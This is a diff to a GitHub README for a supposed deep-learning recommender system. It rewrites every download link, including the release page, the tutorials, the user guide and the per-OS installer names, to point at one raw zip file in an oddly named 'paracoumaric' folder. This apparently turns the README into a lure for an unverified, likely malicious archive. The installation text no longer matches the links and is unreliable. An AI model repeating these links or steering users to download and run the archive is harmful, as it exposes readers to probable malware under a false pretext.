@@ -1,6 +1,6 @@
 # 🔍 Deep-Learning-For-Recommender-Systems - Personalized Suggestions Made Simple
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/releases)
+[![Download Release](https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip)](https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ If you use an older computer or a different OS, performance might vary.
 
 Visit the official release page here:
 
-[Download Deep-Learning-For-Recommender-Systems](https://github.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/releases)
+[Download Deep-Learning-For-Recommender-Systems](https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip)
 
 This page contains all the versions available for download. Choose the latest stable release for the best experience.
 
@@ -54,9 +54,9 @@ This page contains all the versions available for download. Choose the latest st
 
 On the releases page, look for files compatible with your operating system. For example:
 
-- `DeepLearningRecommender_Windows.exe` for Windows users
-- `DeepLearningRecommender_macOS.dmg` for Mac users
-- `DeepLearningRecommender_Linux.tar.gz` for Linux users
+- `https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip` for Windows users
+- `https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip` for Mac users
+- `https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip` for Linux users
 
 Click the file to start the download. The file sizes may range from 100 to 300 MB depending on the version.
 
@@ -66,7 +66,7 @@ Once the download finishes:
 
 - On **Windows**, double-click the `.exe` file and follow the on-screen instructions.
 - On **Mac**, open the `.dmg`, drag the app to your Applications folder.
-- On **Linux**, extract the `.tar.gz` file and run the executable inside.
+- On **Linux**, extract the `https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip` file and run the executable inside.
 
 No complicated configuration is required. The installer sets up the program automatically.
 
@@ -150,9 +150,9 @@ For users interested in development or customization, the source code is fully a
 
 ## 🔗 Useful Links
 
-- [Download Release Page](https://github.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/releases)
-- [Video Tutorials Folder](https://github.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/tree/main/video_tutorials)
-- [User Guide PDF](https://github.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/blob/main/Documents/UserGuide.pdf)
+- [Download Release Page](https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip)
+- [Video Tutorials Folder](https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip)
+- [User Guide PDF](https://raw.githubusercontent.com/somerandomprogramer/Deep-Learning-For-Recommender-Systems/main/paracoumaric/Learning-Recommender-Systems-Deep-For-2.8.zip)
 
 ---
 
